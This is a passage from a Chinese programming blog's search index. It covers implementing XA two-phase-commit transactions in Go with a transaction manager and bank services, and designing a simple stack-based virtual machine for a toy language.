appvolumes:- ./scripts/nginx/default.conf:/etc/nginx/conf.d/default.conf:rotm:build:context:.dockerfile:docker/tm.Dockerfileexpose:- 5000restart:alwaysdepends_on:- mysqlbank1:build:context:.dockerfile:docker/bank.Dockerfilecommand:[\u0026#34;/bank\u0026#34;,\u0026#34;-bank-id\u0026#34;,\u0026#34;1\u0026#34;]expose:- 5000restart:alwaysdepends_on:- tm- mysqlbank2:build:context:.dockerfile:docker/bank.Dockerfilecommand:[\u0026#34;/bank\u0026#34;,\u0026#34;-bank-id\u0026#34;,\u0026#34;2\u0026#34;]expose:- 5000restart:alwaysdepends_on:- tm- mysqlapp:build:context:.dockerfile:docker/app.Dockerfileexpose:- 5000restart:alwaysdepends_on:- tm- bank1- bank2- mysql  其中 Bank1/Bank2 用的同一套代码，以命令行参数来区分连接不同的数据库。\n#5 TM 实现 创建全局事务 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  func createGlobalTx(c *gin.Context) { req := \u0026amp;tm.CreateGlobalTxReq{} c.BindJSON(req) db := c.MustGet(\u0026#34;db\u0026#34;).(*sqlx.DB) _, err := db.NamedExecContext(c.Request.Context(), `INSERT INTO global_tx(gid) VALUES(:gid)`, \u0026amp;tm.GlobalTx{GID: req.GID}) if err != nil { c.Error(err) return } c.JSONP(200, map[string]interface{}{ \u0026#34;code\u0026#34;: 0, \u0026#34;message\u0026#34;: \u0026#34;ok\u0026#34;, }) }   暂时没有考虑更多全局事务的用法，只是单纯的保存。\n注册本地事务 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  func registerLocalTx(c *gin.Context) { req := \u0026amp;tm.RegisterLocalTxReq{} c.BindJSON(req) db := c.MustGet(\u0026#34;db\u0026#34;).(*sqlx.DB) _, err := db.NamedExecContext( c.Request.Context(), `INSERT INTO local_tx(gid,branch_id,callback_url) values(:gid, :branch_id, :callback_url)`, \u0026amp;tm.LocalTx{ GID: req.GID, BranchID: req.BranchID, CallbackUrl: req.CallbackUrl, }, ) if err != nil { c.Error(err) return } c.JSONP(200, map[string]interface{}{ \u0026#34;code\u0026#34;: 0, \u0026#34;message\u0026#34;: \u0026#34;ok\u0026#34;, }) }   本地事务需要记录下对应的全局事务ID和分支ID（就是这个本地事务的ID，用于回调的时候告诉RM提交哪个本地事务，在MySQL XA里就是XID 的 bqual 部分），以及回调的地址。\n提交全局事务 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  func commitGlobalTx(c *gin.Context) { req := \u0026amp;tm.CommitGlobalTxReq{} c.BindJSON(req) db := c.MustGet(\u0026#34;db\u0026#34;).(*sqlx.DB) allLocalTx := make([]tm.LocalTx, 0) err := db.SelectContext(c.Request.Context(), \u0026amp;allLocalTx, \u0026#34;SELECT * FROM local_tx WHERE gid=?\u0026#34;, req.GID) if err != nil { c.Error(err) return } // TODO 极端情况下，回调 RM 时出现部分失败要如何处理？ \tcli := \u0026amp;http.Client{Transport: otelhttp.NewTransport(http.DefaultTransport)} for _, tx := range allLocalTx { callbackPayload := \u0026amp;bank.TMCallbackReq{Action: \u0026#34;commit\u0026#34;, GID: req.GID, BranchID: tx.BranchID} callbackResp := bank.TMCallbackResp{} err = client.WrappedPost(c.Request.Context(), cli, tx.CallbackUrl, callbackPayload, \u0026amp;callbackResp) if err != nil { c.Error(err) return } if callbackResp.Code != 0 { c.JSONP(500, \u0026amp;tm.CommitGlobalTxResp{ Code: -1, Message: fmt.Sprintf(\u0026#34;commit local tx failed, response code %d, %s\u0026#34;, callbackResp.Code, callbackResp.Message), }) return } } c.JSONP(200, map[string]interface{}{ \u0026#34;code\u0026#34;: 0, \u0026#34;message\u0026#34;: \u0026#34;ok\u0026#34;, }) }   全局事务的提交，本质是由TM负责逐个告知RM提交自己的本地事务，也是整个 XA 过程里最重要也最脆弱的一步。理论上来说这时的 XA 事务无论是提交还是回滚都应该无条件成功。\n但TM本身，以及TM和RM之间的网络存在故障的可能。如果TM崩溃，或者TM和RM之间出现网络分区，导致TM无法发出提交或回滚的消息时，就会导致参与者陷入长时间的阻塞，直到TM恢复运行，或网络恢复畅通，参与者收到TM发出的Commit或Rollback消息为止。\n更可能出现的情况是，一个或几个参与者出现网络分区或崩溃，没有收到 Commit 消息，只能继续阻塞等待，TM也需要不断重试。参与者不能依据超时时间武断提交或回滚，因为TM很可能发出了提交的指令，只是因为网络状况不佳等原因未能及时送达。这一情况也可以通过参与者之间互相询问来解决，等待超时的参与者可以询问其他参与者，如果有参与者未准备则可以确定需要回滚，如果有参与者已经提交，则也可以确定需要提交。但如果所有参与者都处于就绪状态，则无法判断TM的最终决策，只能继续傻等。\n另外关于网络分区（就是CAP中的P），假如说消息发送者会不断重试发送，直到接收者告知成功，暂且认为多次发送消息产生的结果是幂等的，那么接收者因为网络原因未能接收到消息，和接收到了消息，但因为接收者本身的故障或资源不足等原因未能处理消息就崩溃重启的话，实质上和网络分区的结果是差不多的，都可以看作是接收者未能收到消息。举例来说就是一个HTTP请求在程序中间件里触发了崩溃，没有执行任何业务逻辑，直到压力缓解后才恢复，这种情况放在上面的场景（TM回调提交本地事务）里分析，和出现网络分区的情况是很接近的。（PS：开脑洞，别当真啊，应该和 P 还是不大一样的）\n所以总结就是，TM要保证最终一致，所有的XA事务都被提交或回滚。一旦进入提交或回滚全局事务的状态，则需要无限次尝试回调提交或回滚本地事务，直至全部成功。上面的案例代码是没有考虑重试的情况，实际应该在函数里不断重试，直到成功。或者直接放到后台去跑，返回个提交进行中也是一种办法。大部分情况下应该是不会有问题的，直接重试也还能接受。可以给个超时，如果出现部分失败就放到后台去慢慢跑，先返回个进行中。\n虽然保证了一致性（CAP里的C），也容忍了叫参与者提交本地事务失败而产生的分区（P），但这样做必然是要舍弃一部分可用性（A）的。所以 XA 事务是一种保证 CP 的分布式事务解决方案。\n回滚本地事务 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  func rollbackGlobalTx(c *gin.Context) { req := \u0026amp;tm.RollbackGlobalTxReq{} c.BindJSON(req) db := c.MustGet(\u0026#34;db\u0026#34;).(*sqlx.DB) allLocalTx := make([]tm.LocalTx, 0) err := db.SelectContext(c.Request.Context(), \u0026amp;allLocalTx, \u0026#34;SELECT * FROM local_tx WHERE gid=?\u0026#34;, req.GID) if err != nil { c.Error(err) return } // TODO 极端情况下，回调 RM 时出现部分失败要如何处理？ \tcli := \u0026amp;http.Client{Transport: otelhttp.NewTransport(http.DefaultTransport)} for _, tx := range allLocalTx { callbackPayload := \u0026amp;bank.TMCallbackReq{Action: \u0026#34;rollback\u0026#34;, GID: req.GID, BranchID: tx.BranchID} callbackResp := bank.TMCallbackResp{} err = client.WrappedPost(c.Request.Context(), cli, tx.CallbackUrl, callbackPayload, \u0026amp;callbackResp) if err != nil { c.Error(err) return } if callbackResp.Code != 0 { c.JSONP(500, \u0026amp;tm.RollbackGlobalTxResp{ Code: -1, Message: fmt.Sprintf(\u0026#34;rollback local tx failed, response code %d, %s\u0026#34;, callbackResp.Code, callbackResp.Message), }) return } } c.JSONP(200, map[string]interface{}{ \u0026#34;code\u0026#34;: 0, \u0026#34;message\u0026#34;: \u0026#34;ok\u0026#34;, }) }   回滚的逻辑和提交是一样的，不多做解释了。\n#6 Bank 实现 转入 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56  func transIn(c *gin.Context) { req := \u0026amp;bank.TransInReq{} c.BindJSON(req) db := c.MustGet(\u0026#34;db\u0026#34;).(*sqlx.DB) cli := client.NewTMClient(\u0026#34;http://tm:5000\u0026#34;) branchID := tm.MustGenBranchID(\u0026#34;TransIn\u0026#34;) resp, err := cli.RegisterLocalTx(c.Request.Context(), \u0026amp;tm.RegisterLocalTxReq{ GID: req.GID, BranchID: branchID, CallbackUrl: fmt.Sprintf(\u0026#34;http://bank%d:5000/v1alpha1/tm_callback\u0026#34;, flgBankID), }) if err != nil { c.Error(err) return } if resp.Code != 0 { c.JSONP(500, \u0026amp;bank.TransInResp{ Code: -1, Message: \u0026#34;register local tx failed\u0026#34;, }) return } // 业务逻辑 \t// 准备 XA 事务 \txid := fmt.Sprintf(\u0026#34;\u0026#39;%s\u0026#39;,\u0026#39;%s\u0026#39;\u0026#34;, req.GID, branchID) _, err = db.ExecContext(c.Request.Context(), fmt.Sprintf(\u0026#34;XA BEGIN %s\u0026#34;, xid)) if err != nil { c.Error(err) return } _, err = db.ExecContext(c.Request.Context(), \u0026#34;UPDATE wallet SET balance=balance+? WHERE id=?\u0026#34;, req.Amount, req.ID) if err != nil { c.Error(err) return } _, err = db.ExecContext(c.Request.Context(), fmt.Sprintf(\u0026#34;XA END %s\u0026#34;, xid)) if err != nil { c.Error(err) return } _, err = db.ExecContext(c.Request.Context(), fmt.Sprintf(\u0026#34;XA PREPARE %s\u0026#34;, xid)) if err != nil { c.Error(err) return } c.JSONP(200, map[string]interface{}{ \u0026#34;code\u0026#34;: 0, \u0026#34;message\u0026#34;: \u0026#34;ok\u0026#34;, }) }   如果把MySQL视作RM的话，Bank服务就是连通TM和AP的桥梁。放到转账的场景里，假设AP是支付宝，那能指望支付宝去直接访问银行的数据库吗？比如支付宝从基金里提款，调用基金的提款接口和银行的转账，也是个类似的场景。当然具体业务不能直接套XA，就是举个例子。\n转入的接口本身就是代理了一下 MySQL 的 update 语句，实际业务场景里可能还会有更多业务逻辑上的判断。\n转出 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57  func transOut(c *gin.Context) { req := \u0026amp;bank.TransOutReq{} c.BindJSON(req) db := c.MustGet(\u0026#34;db\u0026#34;).(*sqlx.DB) cli := client.NewTMClient(\u0026#34;http://tm:5000\u0026#34;) branchID := tm.MustGenBranchID(\u0026#34;TransOut\u0026#34;) // 注册本地事务 \tresp, err := cli.RegisterLocalTx(c.Request.Context(), \u0026amp;tm.RegisterLocalTxReq{ GID: req.GID, BranchID: branchID, CallbackUrl: fmt.Sprintf(\u0026#34;http://bank%d:5000/v1alpha1/tm_callback\u0026#34;, flgBankID), }) if err != nil { c.Error(err) return } if resp.Code != 0 { c.JSONP(500, \u0026amp;bank.TransInResp{ Code: -1, Message: \u0026#34;register local tx failed\u0026#34;, }) return } // 业务逻辑 \t// 准备 XA 事务 \txid := fmt.Sprintf(\u0026#34;\u0026#39;%s\u0026#39;,\u0026#39;%s\u0026#39;\u0026#34;, req.GID, branchID) _, err = db.ExecContext(c.Request.Context(), fmt.Sprintf(\u0026#34;XA BEGIN %s\u0026#34;, xid)) if err != nil { c.Error(err) return } _, err = db.ExecContext(c.Request.Context(), \u0026#34;UPDATE wallet SET balance=balance-? WHERE id=?\u0026#34;, req.Amount, req.ID) if err != nil { c.Error(err) return } _, err = db.ExecContext(c.Request.Context(), fmt.Sprintf(\u0026#34;XA END %s\u0026#34;, xid)) if err != nil { c.Error(err) return } _, err = db.ExecContext(c.Request.Context(), fmt.Sprintf(\u0026#34;XA PREPARE %s\u0026#34;, xid)) if err != nil { c.Error(err) return } c.JSONP(200, map[string]interface{}{ \u0026#34;code\u0026#34;: 0, \u0026#34;message\u0026#34;: \u0026#34;ok\u0026#34;, }) }   转出的代码其实有点问题，漏掉了检查余额，其他和转入的接口就没什么区别了。\n#7 AP 实现 转账 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95  func transfer(c *gin.Context) { req := \u0026amp;TransferReq{} c.BindJSON(req) tmcli := client.NewTMClient(\u0026#34;http://tm:5000\u0026#34;) gid := tm.MustGenGID() resp, err := tmcli.CreateGlobalTx(c.Request.Context(), \u0026amp;tm.CreateGlobalTxReq{GID: gid}) if err != nil { c.Error(err) return } if resp.Code != 0 { c.JSONP(500, \u0026amp;GeneralResp{ Code: -1, Message: \u0026#34;create global transaction failed\u0026#34;, }) return } cli1 := client.NewBankClient(\u0026#34;http://bank1:5000\u0026#34;) transInResp, err := cli1.TransIn(c.Request.Context(), \u0026amp;bank.TransInReq{GID: gid, ID: req.ToID, Amount: req.Amount}) if err != nil { // 失败的话就等着超时 \tc.Error(err) _, _ = tmcli.RollbackGlobalTx(c.Request.Context(), \u0026amp;tm.RollbackGlobalTxReq{GID: gid}) c.JSONP(500, \u0026amp;GeneralResp{ Code: -1, Message: \u0026#34;trans in failed\u0026#34;, }) return } if transInResp.Code != 0 { // 失败的话就等着超时 \t_, _ = tmcli.RollbackGlobalTx(c.Request.Context(), \u0026amp;tm.RollbackGlobalTxReq{GID: gid}) c.JSONP(500, \u0026amp;GeneralResp{ Code: -1, Message: \u0026#34;trans in failed\u0026#34;, }) return } cli2 := client.NewBankClient(\u0026#34;http://bank2:5000\u0026#34;) transOutResp, err := cli2.TransOut(c.Request.Context(), \u0026amp;bank.TransOutReq{GID: gid, ID: req.ToID, Amount: req.Amount}) if err != nil { // 失败的话就等着超时 \tc.Error(err) _, _ = tmcli.RollbackGlobalTx(c.Request.Context(), \u0026amp;tm.RollbackGlobalTxReq{GID: gid}) c.JSONP(500, \u0026amp;GeneralResp{ Code: -1, Message: \u0026#34;trans out failed\u0026#34;, }) return } if transOutResp.Code != 0 { // 失败的话就等着超时 \t_, _ = tmcli.RollbackGlobalTx(c.Request.Context(), \u0026amp;tm.RollbackGlobalTxReq{GID: gid}) c.JSONP(500, \u0026amp;GeneralResp{ Code: -1, Message: \u0026#34;trans out failed\u0026#34;, }) return } commitResp, err := tmcli.CommitGlobalTx(c.Request.Context(), \u0026amp;tm.CommitGlobalTxReq{GID: gid}) if err != nil { // 失败的话就等着超时 \tc.Error(err) _, _ = tmcli.RollbackGlobalTx(c.Request.Context(), \u0026amp;tm.RollbackGlobalTxReq{GID: gid}) c.JSONP(500, \u0026amp;GeneralResp{ Code: -1, Message: \u0026#34;commit failed\u0026#34;, }) return } if commitResp.Code != 0 { // 失败的话就等着超时 \t_, _ = tmcli.RollbackGlobalTx(c.Request.Context(), \u0026amp;tm.RollbackGlobalTxReq{GID: gid}) c.JSONP(500, \u0026amp;GeneralResp{ Code: -1, Message: \u0026#34;commit failed\u0026#34;, }) return } c.JSONP(200, map[string]interface{}{ \u0026#34;code\u0026#34;: 0, \u0026#34;message\u0026#34;: \u0026#34;ok\u0026#34;, }) }   AP代码主要就是调各个RM，发起转入/转出操作，以及在出现问题的情况下回滚全局事务。\n当然，AP回滚全局事务也会出现网络分区的情况，AP崩溃或者网络故障而无法连接TM，也就无法告诉TM是不是所有参与者都准备就绪，TM只能自己等超时后去回调参与者，让参与者回滚所有本地事务。\n这里和参与者出现分区又不大一样，AP出现分区最多是导致原本该提交的事务被回滚，并不会破坏一致性，也就满足了CP。但事务被回滚，等于是失去了可用性，不满足CAP中的A。\n#8 关于TCC TCC 是 Try-Confirm-Cancel 的缩写，最早是由 Pat Helland 于 2007 年发表的一篇名为《Life beyond Distributed Transactions:an Apostate’s Opinion》的论文提出。这里只讲一下个人理解，因为 TCC 的时序图和 XA 可以说是一模一样。\nTCC 也是一种 2 阶段提交的协议，和 XA 模型的主要区别是本地事务的准备和提交是业务层面上做的接口，业务上可控性更好的同时，也要求对服务接口进行大刀阔斧的修改，开发量会大很多。TCC 也可以用数据库的 XA 实现。\nTCC 的一个重要优点是可以减少数据库资源锁定，比如说，采用 TCC 方式开发一个添加账单的接口，Try 阶段可以直接 INSERT 一个隐藏的账单，Confirm 阶段把账单设置为可见，Cancel 阶段则删除。如果因为某些原因，很长时间没有进入 Confirm 阶段，TCC 服务也不会有什么影响。而 XA 方式一方面要数据库支持，一方面数据库要维持锁，消耗会更大。\n#9 分布式事务问题 分布式事务需要服务在接口做好一定的保护措施，遵循一定的编程规范，来避免错误发生。\n空补偿 空补偿问题，指的是服务因为一些原因没有收到 PREPARE 请求，在 TM 发起了回滚操作时收到了 ROLLBACK 请求。此时服务并没有需要回滚的本地事务，也就是空补偿（或者叫空回滚）。\n如果服务没有处理空补偿，返回了错误，TM就会认为服务没有回滚成功进而不断重试。\n防悬挂 事务悬挂问题，指的是因为网络拥塞等原因，PREPARE 请求晚于 ROLLBACK 请求到来的情况。此时服务已经做了空补偿，全局事务被回滚，迟到的 PREPARE 请求不对应任何全局事务，也就是“垂悬的”。\n关于垂悬这个术语，是从 dangling (dangle的进行时) 翻译而来。比如垂悬指针 dangling pointer 指的是已经被指向已经被释放的空间的指针，垂悬事务对应的就是指向已经被回滚的全局事务的本地事务。\n对于全局事务已经被回滚的情况，服务应该不执行 PREPARE，超时到 TM 都回滚了，大概也没法返回错误，客户端连接都可能断开了。\n幂等 因为网络延迟和抖动的存在，服务可能会收到多次 PREPARE/COMMIT/ROLLBACK 。对这种情况也要保证同样的条件下，一次请求和多次请求产生的结果是一致的。\n换言之，同样的参数PREPARE多次，和一次 PREPARE 一致。多余的 PREPARE 可以啥也不做。同样的 COMMIT/ROLLBACK 多次，也是等于只 COMMIT/ROLLBACK 一次。\n总结 主要研究了2阶段提交的主要过程、接口设计、TM实现以及2阶段提交协议中可能遇到的一些问题。代码主要是辅助思考，并没有真正的成果。\n2阶段提交过程：\n prepare commit/rollback  2阶段提交的基本时序：\n 注册全局事务 注册本地事务（prepare）  如果失败，则回滚全局事务   提交全局事务  全局事务的提交和回滚都不允许部分失败的情况，一旦PREPARE成功，提交或回滚都必须成功。如果出现临时失败（网络问题或者崩溃），则不断重试直到全部成功。\n分布式事务常见问题：\n 空补偿问题。出现在没有 PREPARE 就调用了 ROLLBACK 的情况。需要支持。 垂悬问题。出现在先调用了 ROLLBACK 才调用 PREPARE 的情况。不进行 PREPARE。 幂等问题。出现在以同样的条件多次调用 PREPARE/COMMIT/ROLLBACK 的情况。多次调用应和一次调用结果一致。  之后可能再研究下分布式事务问题的具体实践，或者实现下 TCC 之类其他的分布式事务模型。\n最终代码在 github.com/nnnewb/dt\n","date":"2021-12-16T15:00:00+08:00","permalink":"https://nnnewb.github.io/blog/p/xa-transaction-theory-to-practice/","title":"XA 事务从理论到实践"},{"content":"前言 之前写了个s表达式求值器，很简陋，直接在抽象语法树上执行。只是这样的话其实还没啥意思，所以再试试改进成在基于栈的虚拟机上执行。\n0x01 虚拟机模型 首先得承认对这些语言层级的虚拟机不熟，基本是随便设计的。\n对象模型 虚拟机指令操作的目标是 对象 ，包括内建的对象和用户定义的对象，虚拟机指令操作的基本单位也是对象。\n目前关注的是内建的对象，简单抽象出了几个基本类型。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  type Object interface { TypeName() string } type UInt uint64 func (u UInt) TypeName() string { return \u0026#34;UInt\u0026#34; } type Float float64 func (f Float) TypeName() string { return \u0026#34;Float\u0026#34; } type Boolean bool func (b Boolean) TypeName() string { return \u0026#34;boolean\u0026#34; } type String string func (s String) TypeName() string { return \u0026#34;string\u0026#34; } type Symbol string func (s Symbol) TypeName() string { return \u0026#34;symbol\u0026#34; } type Nil struct{} func (n Nil) TypeName() string { return \u0026#34;nil\u0026#34; }   省略了一部分，领会精神即可。上面定义的 Symbol 类型其实就是 #ident 这种语法元素，目的是保持语义上的简洁。\n比如说 (let a b)，在 minilang 里解释成以a和b作为参数，调用let函数，a和b都会被求值。let是一个内置函数，在当前环境里定义一个新的变量并设初值。\n可实际写代码的人想要的可能是 定义a，初始化为b。这种情况下我们不希望a被求值，而是字面意思：标识符a，传给let函数。这种情况下就可以用 (let #a b) ，#a 表示一个 Symbol 类型的字面量。\n或许有人会注意到本质上来说#a是个语法糖，也可以被写成 (quote \u0026quot;a\u0026quot;) 这样的形式。quota 定义为将字符串构造成 Symbol 对象的函数。\n指令集 有了基本的对象模型，再定义最基本的指令。因为考虑将代码也视作数据，所以目前的想法还是把控制结构也做成内置函数，因此指令集里不需要太多转移指令。\n暂定的指令集如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  type OpCode int32 const ( RESERVED = iota // CALL \u0026lt;STR\u0026gt; \t// 压栈下一条指令的地址，跳转到指定位置 \tCALL // RET \u0026lt;OBJ\u0026gt; \t// 取栈顶的对象作为跳转地址，压栈返回值 \tRET // LOAD \u0026lt;STR\u0026gt; \t// 读取局部环境里的变量压栈 \tLOAD // PUSH \u0026lt;NUM\u0026gt; \t// 压栈对象 \tPUSH // POP \u0026lt;NUM\u0026gt; \t// 出栈一定数量的对象，出栈的对象直接丢弃 \tPOP ) func (o OpCode) String() string { return []string{ \u0026#34;RESERVED\u0026#34;, \u0026#34;CALL\u0026#34;, \u0026#34;RET\u0026#34;, \u0026#34;LOAD\u0026#34;, \u0026#34;PUSH\u0026#34;, \u0026#34;POP\u0026#34;, }[o] }   除了最初的 RESERVED 是故意占用了零值，剩下的就是有效的指令了。\n写过 x86 汇编的话会看的很不习惯，因为完全没考虑寻址。\n CALL 指令的操作数对象是字符串的时候，在本地环境寻找对应名称的内建函数；  或者，操作数是 UINT 的话，压栈下一条指令地址后跳转到指定位置，和 x86 汇编类似；   RET 把当前栈顶的变量(UINT)当成下一个指令的地址 LOAD 在本地环境寻找对应名称的变量压栈  剩余略。其实可以看出直接对机器编程中的寻址被替换成了根据变量名（字符串）查找本地环境，很多高层级的概念（对象、字符串）被糅杂在里面。\n0x02 编译 接下来是把抽象语法树翻译成指令序列。\n字面量翻译 因为 minilang 的指令直接操作对象，所以能很省事地把字面量都构造成相应地对象。对于更复杂的对象，也可以编译成构造指令，当然目前不涉及。\n举个例子，列表字面量 #(display hello)。可以在编译过程里直接构造出 List 对象，然后生成一个 PUSH List{} 指令，这样做的好处是更简单，效率会更好一点，毕竟少几个解释执行的指令。相应的限制是不能引用环境里的变量，因为在构造字面量对象的过程里还没有进入运行时环境。\n比如说 #(display name)，如果编译成 PUSH List{display, name}，那么name在此刻就不能被求值，必须延迟到执行的时候才能求值name。这里又涉及编译期的计算，比如我可以定义一个编译阶段执行的指令格式 [elem...]，编译的时候对 [elem...]求值，求值结果写进编译出的指令里。也是后话。\n编译成指令的好处是之后要做 JIT 或者全量编译成本地代码的话，不需要重新处理这个字面量，写一堆 case 把字面量编译成几个函数调用。\n扯远了，先前我们拿 gocc 生成好了语法树，接下来就是简单地做一下翻译。\n1 2  case ast.Boolean, ast.UInt, ast.Float, ast.Symbol, *ast.Quoted, ast.String: instructions = append(instructions, push(vm.ObjectFromLiteral(node)))   其中 vm.ObjectFromLiteral(node) 就是负责把从抽象语法树节点构造出对象实例的函数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  func ObjectFromLiteral(node ast.Node) Object { switch node := node.(type) { case ast.Float: return Float(node) case ast.UInt: return UInt(node) case ast.String: return String(node) case ast.Boolean: return Boolean(node) case *ast.Quoted: lst := \u0026amp;List{} for _, n := range node.GetValue().([]ast.Node) { lst.underlying = append(lst.underlying, ObjectFromLiteral(n)) } return lst case ast.Symbol: return Symbol(node) default: log.Fatalf(\u0026#34;unexpected ast node in ToValue %v(%T)\u0026#34;, node, node) } return nil }   Quoted 表示列表字面量。这个函数本身很简单很直白，限制是对于非字面量的节点不能求值（比如 Identifier、函数调用都只能在运行时求值）。\n函数调用翻译 接着就是重头戏，函数调用的翻译。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  case *ast.List: elements := node.GetValue().([]ast.Node) if len(elements) == 0 { return make([]vm.Instruction, 0), nil } // 参数从右到左压栈  for i := len(elements) - 1; i \u0026gt; 0; i-- { if inst, err := c.Compile(elements[i]); err != nil { return nil, err } else { instructions = append(instructions, inst...) } } // 压入参数数量  instructions = append(instructions, push(vm.UInt(len(elements)-1))) // 插入调用语句  callee := elements[0] if ident, ok := callee.(ast.Identifier); ok { instructions = append(instructions, vm.Instruction{ OpCode: vm.CALL, Operand: []vm.Object{vm.Symbol(ident)}, }) }   谈函数调用的编译前必须先确定好调用约定。这里采用了和 cdecl 类似的调用约定，参数从右往左压栈，同时在最左添加一个参数数量的参数，就像是 object f(object argc, object ...argv) 一样，领会精神。\n函数的返回值一律包装成 object 返回，不允许多返回值（但可以考虑加个解构语法之类的糖），返回值也通过栈传递。\n整个函数调用的过程可以描述为：\n 调用方参数压栈 调用方参数数量压栈 调用方返回地址压栈 调用方跳转到函数入口（或者进入内置函数） 被调方弹出返回地址 被调方弹出所有参数 被调方压栈返回值 被调方跳转至返回地址  一句话概括就是被调方清栈，返回值放在栈顶。对于内置函数，步骤5-8都要在内置函数里完成。之后做用户定义 procedure 的话就要在 procedure 编译结果里加上平栈的代码了。现在还在纠结 POP 指令直接把弹出的对象给丢弃了，该怎么暂存返回地址。实在不行就改成调用方清栈得了。\n0x03 虚拟机抽象 虚拟机理解为一个状态容器，包括指令空间（指令集合和指令指针）、数据空间（栈、本地变量），给一个简单的构造器。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  type MiniVM struct { Stack []Object // 栈空间，包括传参和本地变量都存放在这里 \tTop int // 栈顶地址 \tLocals map[string]Object // 本地变量，从这里查找变量和可调用的对象 \tIP UInt // Instruction Pointer 指令指针 \tInstructions []Instruction // 程序指令集合 } func NewMiniVM(instructions []Instruction) *MiniVM { return \u0026amp;MiniVM{ Stack: make([]Object, 0), Top: -1, IP: 0, Instructions: instructions, Locals: make(map[string]Object), } }   然后定义每个指令的执行逻辑。这里其实有点像是设计模式里的命令模式（Commnad Pattern）。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98  func (m *MiniVM) instCall(inst Instruction) error { if len(inst.Operand) == 0 { return fmt.Errorf(\u0026#34;invalid CALL instruction: %s\u0026#34;, inst) } if sym, ok := inst.Operand[0].(Symbol); ok { if proc, err := m.LookupProc(string(sym)); err != nil { return err } else { if proc.isBuiltin { m.Push(UInt(m.IP + 1)) return proc.Builtin(m) } else if proc.Location != 0 { m.Push(UInt(m.IP + 1)) m.IP = UInt(proc.Location) } else { log.Fatalf(\u0026#34;invalid Procedure object\u0026#34;) return nil } } return nil } log.Fatalf(\u0026#34;invalid CALL instruction operand %v\u0026#34;, inst.Operand) return nil } func (m *MiniVM) instRet(inst Instruction) error { if len(inst.Operand) == 0 { return fmt.Errorf(\u0026#34;invalid RET instruction: %s\u0026#34;, inst) } returnAddress := m.Pop().(UInt) m.IP = returnAddress m.Push(inst.Operand[0]) return nil } func (m *MiniVM) instPush(inst Instruction) error { if len(inst.Operand) == 0 || len(inst.Operand) \u0026gt; 1 { return fmt.Errorf(\u0026#34;invalid PUSH instruction: %s\u0026#34;, inst) } m.Push(inst.Operand[0]) return nil } func (m *MiniVM) instPop(inst Instruction) error { if len(inst.Operand) == 0 || len(inst.Operand) \u0026gt; 1 { return fmt.Errorf(\u0026#34;invalid POP instruction: %s\u0026#34;, inst) } m.Pop() return nil } func (m *MiniVM) instLoad(inst Instruction) error { if len(inst.Operand) == 0 || len(inst.Operand) \u0026gt; 1 { return fmt.Errorf(\u0026#34;invalid LOAD instruction: %s\u0026#34;, inst) } if name, ok := inst.Operand[0].(Symbol); ok { if v, ok := m.Locals[string(name)]; ok { m.Push(v) } else { return fmt.Errorf(\u0026#34;undefined name %s\u0026#34;, name) } } else { return fmt.Errorf(\u0026#34;unexpected operand for instruction LOAD %v(%T)\u0026#34;, inst.Operand[0], inst.Operand[0]) } return nil } func (m *MiniVM) ExecNextInstruction() error { if int(m.IP) \u0026gt;= len(m.Instructions) { return ErrNoMoreInstructions } inst := m.Instructions[m.IP] switch inst.OpCode { case CALL: return m.instCall(inst) case RET: m.instRet(inst) case PUSH: m.instPush(inst) case POP: m.instPop(inst) case LOAD: m.instLoad(inst) default: return fmt.Errorf(\u0026#34;unexpected opcode %v\u0026#34;, inst.OpCode) } m.IP++ return nil }   0x04 结果展示 PS：这个 + 也是函数。\n总结 这个简单的 VM 写的时候脑子里想的都是 x86 汇编和 Python 的类型，所以内置类型定义就很粗暴，指令 OpCode 定义也是想当然。写成这样当然还是不满意的，都费了这么大劲了，简简单单做个 JIT 不过分吧？\n但讲老实的，我还真不知道不用 CGO 的情况下，我就算是拿 syscall 这个包分配好了读写执行的空间也成功汇编出了机器码，也不知道怎么去调 Go 里定义的函数和数据结构。这一点看，要是一开始拿 C 写的话，问题就会好解决很多：够底层嘛，不用担心移植性和运行时的封装。\n不过也不是真的一点办法也没有，干脆把内建类型和函数全部拿 C 或者 minilang 自己实现就好了，定义好数据结构，minilang 编译出来的指令全是调用自己或者调用C函数，再想翻译到汇编指令就简单很多了。到了这一步，直接拿 minilang 写一个编译自己的编译器也不是不行。\n","date":"2021-12-13T16:20:00+08:00","permalink":"https://nnnewb.github.io/blog/p/stack-based-virtual-machine-for-minilang/","title":"基于栈的虚拟机"},{"content":"前言 